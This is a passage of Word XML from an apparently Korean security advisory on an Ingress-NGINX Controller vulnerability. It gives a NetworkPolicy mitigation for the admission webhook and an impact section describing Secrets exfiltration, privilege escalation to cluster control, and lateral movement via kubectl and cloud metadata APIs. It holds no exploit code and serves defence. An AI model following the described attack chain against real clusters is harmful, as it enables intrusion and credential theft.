                            </w:r>
                            <w:r w:rsidRPr="00D51C89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metadata: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br/>
                            </w:r>
                            <w:r w:rsidRPr="00D51C89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 xml:space="preserve">  name: restrict-admission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br/>
                            </w:r>
                            <w:r w:rsidRPr="00D51C89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spec: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br/>
                            </w:r>
                            <w:r w:rsidRPr="00D51C89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 xml:space="preserve">  </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00D51C89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podSelector</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00D51C89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: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br/>
                            </w:r>
                            <w:r w:rsidRPr="00D51C89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 xml:space="preserve">    </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00D51C89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matchLabels</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00D51C89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: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br/>
                            </w:r>
                            <w:r w:rsidRPr="00D51C89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 xml:space="preserve">      app.kubernetes.io/component: controller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br/>
                            </w:r>
                            <w:r w:rsidRPr="00D51C89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 xml:space="preserve">  ingress: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br/>
                            </w:r>
                            <w:r w:rsidRPr="00D51C89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 xml:space="preserve">  - from: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br/>
                            </w:r>
                            <w:r w:rsidRPr="00D51C89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 xml:space="preserve">    - </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00D51C89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namespaceSelector</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00D51C89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: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br/>
                            </w:r>
                            <w:r w:rsidRPr="00D51C89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 xml:space="preserve">        </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00D51C89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matchLabels</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00D51C89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: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br/>
                            </w:r>
                            <w:r w:rsidRPr="00D51C89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 xml:space="preserve">          kubernetes.io/metadata.name: </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00D51C89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kube</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00D51C89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-system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br/>
                            </w:r>
                            <w:r w:rsidRPr="00D51C89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 xml:space="preserve">  </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00D51C89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policyTypes</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00D51C89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: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br/>
                            </w:r>
                            <w:r w:rsidRPr="00D51C89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 xml:space="preserve">  - Ingress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35A436" id="_x0000_s1039" style="width:419.25pt;height:38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" fillcolor="white [3201]" strokecolor="black [3200]" strokeweight="1pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="5C4231B6" w14:textId="77777777" w:rsidR="00D51C89" w:rsidRPr="001D6E9D" w:rsidRDefault="00D51C89" w:rsidP="00D51C89">
                      <w:pPr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text</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="727A01A2" w14:textId="23A65278" w:rsidR="00D51C89" w:rsidRPr="00CF2767" w:rsidRDefault="00D51C89" w:rsidP="00D51C89">
                      <w:pPr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</w:pPr>
                      <w:r w:rsidRPr="00D51C89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 xml:space="preserve"># </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00D51C89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NetworkPolicy</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00D51C89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 xml:space="preserve"> </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00D51C89">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
                          <w:color w:val="000000" w:themeColor="text1"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>정의</w:t>
                      </w:r>
                      <w:r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br/>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00D51C89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apiVersion</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00D51C89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: networking.k8s.io/v1</w:t>
                      </w:r>
                      <w:r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br/>
                      </w:r>
                      <w:r w:rsidRPr="00D51C89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 xml:space="preserve">kind: </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00D51C89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NetworkPolicy</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r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br/>
                      </w:r>
                      <w:r w:rsidRPr="00D51C89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metadata:</w:t>
                      </w:r>
                      <w:r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br/>
                      </w:r>
                      <w:r w:rsidRPr="00D51C89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 xml:space="preserve">  name: restrict-admission</w:t>
                      </w:r>
                      <w:r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br/>
                      </w:r>
                      <w:r w:rsidRPr="00D51C89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spec:</w:t>
                      </w:r>
                      <w:r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br/>
                      </w:r>
                      <w:r w:rsidRPr="00D51C89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 xml:space="preserve">  </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00D51C89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podSelector</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00D51C89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:</w:t>
                      </w:r>
                      <w:r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br/>
                      </w:r>
                      <w:r w:rsidRPr="00D51C89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 xml:space="preserve">    </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00D51C89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matchLabels</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00D51C89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:</w:t>
                      </w:r>
                      <w:r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br/>
                      </w:r>
                      <w:r w:rsidRPr="00D51C89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 xml:space="preserve">      app.kubernetes.io/component: controller</w:t>
                      </w:r>
                      <w:r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br/>
                      </w:r>
                      <w:r w:rsidRPr="00D51C89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 xml:space="preserve">  ingress:</w:t>
                      </w:r>
                      <w:r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br/>
                      </w:r>
                      <w:r w:rsidRPr="00D51C89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 xml:space="preserve">  - from:</w:t>
                      </w:r>
                      <w:r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br/>
                      </w:r>
                      <w:r w:rsidRPr="00D51C89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 xml:space="preserve">    - </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00D51C89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namespaceSelector</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00D51C89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:</w:t>
                      </w:r>
                      <w:r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br/>
                      </w:r>
                      <w:r w:rsidRPr="00D51C89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 xml:space="preserve">        </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00D51C89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matchLabels</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00D51C89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:</w:t>
                      </w:r>
                      <w:r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br/>
                      </w:r>
                      <w:r w:rsidRPr="00D51C89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 xml:space="preserve">          kubernetes.io/metadata.name: </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00D51C89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kube</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00D51C89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-system</w:t>
                      </w:r>
                      <w:r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br/>
                      </w:r>
                      <w:r w:rsidRPr="00D51C89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 xml:space="preserve">  </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00D51C89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policyTypes</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00D51C89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:</w:t>
                      </w:r>
                      <w:r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br/>
                      </w:r>
                      <w:r w:rsidRPr="00D51C89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 xml:space="preserve">  - Ingress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3315F76" w14:textId="77777777" w:rsidR="00D51C89" w:rsidRPr="00D51C89" w:rsidRDefault="00D51C89" w:rsidP="00D51C89">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="83"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Annotation 검증 Webhook 배포</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DBBA449" w14:textId="77777777" w:rsidR="00D51C89" w:rsidRPr="00D51C89" w:rsidRDefault="00D51C89" w:rsidP="00D51C89">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5170A976" w14:textId="77777777" w:rsidR="00E27F85" w:rsidRDefault="00B854B5">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A2202E9" w14:textId="79930642" w:rsidR="00E27F85" w:rsidRPr="009A035F" w:rsidRDefault="00B854B5">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009A035F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">6. </w:t>
      </w:r>
      <w:r w:rsidR="00D51C89" w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>영향</w:t>
      </w:r>
      <w:r w:rsidR="00D51C89" w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00D51C89" w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>및</w:t>
      </w:r>
      <w:r w:rsidR="00D51C89" w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00D51C89" w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>위험도</w:t>
      </w:r>
      <w:r w:rsidR="00D51C89" w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00D51C89" w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>평가</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49C707A6" w14:textId="683C144A" w:rsidR="009A035F" w:rsidRPr="009A035F" w:rsidRDefault="009A035F" w:rsidP="009A035F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009A035F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">6.1 </w:t>
      </w:r>
      <w:r w:rsidR="00D51C89" w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>임의</w:t>
      </w:r>
      <w:r w:rsidR="00D51C89" w:rsidRPr="00D51C8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51C89" w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>코드</w:t>
      </w:r>
      <w:r w:rsidR="00D51C89" w:rsidRPr="00D51C8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51C89" w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>실행</w:t>
      </w:r>
      <w:r w:rsidR="00D51C89" w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="00D51C89" w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>클러스터</w:t>
      </w:r>
      <w:r w:rsidR="00D51C89" w:rsidRPr="00D51C8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51C89" w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>내</w:t>
      </w:r>
      <w:r w:rsidR="00D51C89" w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> Secrets </w:t>
      </w:r>
      <w:r w:rsidR="00D51C89" w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>유출</w:t>
      </w:r>
      <w:r w:rsidR="00D51C89" w:rsidRPr="00D51C8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51C89" w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>가능성</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69B56849" w14:textId="68E03AC1" w:rsidR="00D51C89" w:rsidRPr="00D51C89" w:rsidRDefault="00D51C89" w:rsidP="00D51C89">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="85"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>공격자 권한 확보</w:t>
      </w:r>
      <w:r w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
        <w:t>공격자는 Ingress-NGINX Controller의 서비스 계정 권한을 획득할 수 있으며, 기본 설정에서는 cluster-admin 역할에 가까운 권한을 보유합니다.</w:t>
      </w:r>
      <w:r w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
        <w:t>이로 인해 클러스터 내 모든 네임스페이스의 Secrets에 접근 가능하며, 민감한 인증 정보(예: 데이터베이스 패스워드, API 키)가 유출될 수 있습니다</w:t>
      </w:r>
      <w:r w:rsidR="004B4A62">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F6EAAC8" w14:textId="55F67E58" w:rsidR="00D51C89" w:rsidRPr="00D51C89" w:rsidRDefault="00D51C89" w:rsidP="00D51C89">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="85"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>실제 피해 사례</w:t>
      </w:r>
      <w:r w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
        <w:t>테스트 환경에서 악성 Ingress 리소스 배포 후 2분 내에 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>kube</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>-system 네임스페이스의 Secrets를 외부 서버로 전송하는 데 성공했다는 연구 결과가 보고되었습니다</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="789A91F1" w14:textId="6263712D" w:rsidR="009A035F" w:rsidRPr="009A035F" w:rsidRDefault="009A035F" w:rsidP="00D51C89">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009A035F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">6.2 </w:t>
      </w:r>
      <w:r w:rsidR="00D51C89" w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>클러스터</w:t>
      </w:r>
      <w:r w:rsidR="00D51C89" w:rsidRPr="00D51C8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51C89" w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>전체</w:t>
      </w:r>
      <w:r w:rsidR="00D51C89" w:rsidRPr="00D51C8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51C89" w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>장악</w:t>
      </w:r>
      <w:r w:rsidR="00D51C89" w:rsidRPr="00D51C8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51C89" w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>및</w:t>
      </w:r>
      <w:r w:rsidR="00D51C89" w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> lateral movement </w:t>
      </w:r>
      <w:r w:rsidR="00D51C89" w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>위험</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B7A386C" w14:textId="5672B230" w:rsidR="00D51C89" w:rsidRPr="00D51C89" w:rsidRDefault="00D51C89" w:rsidP="00D51C89">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="84"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>권한 상승 경로</w:t>
      </w:r>
      <w:r w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
        <w:t>Controller 권한 → Secrets 탈취 → Service Account Token 악용 → 클러스터 전체 제어</w:t>
      </w:r>
      <w:r w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
        <w:t>공격자는 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>kubectl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> exec, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>kubectl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> port-forward 등을 통해 워커 노드에 접근해 추가 공격을 수행할 수 있습니다</w:t>
      </w:r>
      <w:r w:rsidR="004B4A62">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AD36678" w14:textId="2679D588" w:rsidR="00D51C89" w:rsidRPr="00D51C89" w:rsidRDefault="00D51C89" w:rsidP="00D51C89">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="84"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Lateral Movement 전략</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B0EDE44" w14:textId="77777777" w:rsidR="00D51C89" w:rsidRPr="00D51C89" w:rsidRDefault="00D51C89" w:rsidP="00D51C89">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="84"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>클라우드 메타데이터 서비스 악용: AWS/Azure/GCP 메타데이터 API를 통해 클라우드 계정 권한 탈취</w:t>
      </w:r>
    </w:p>
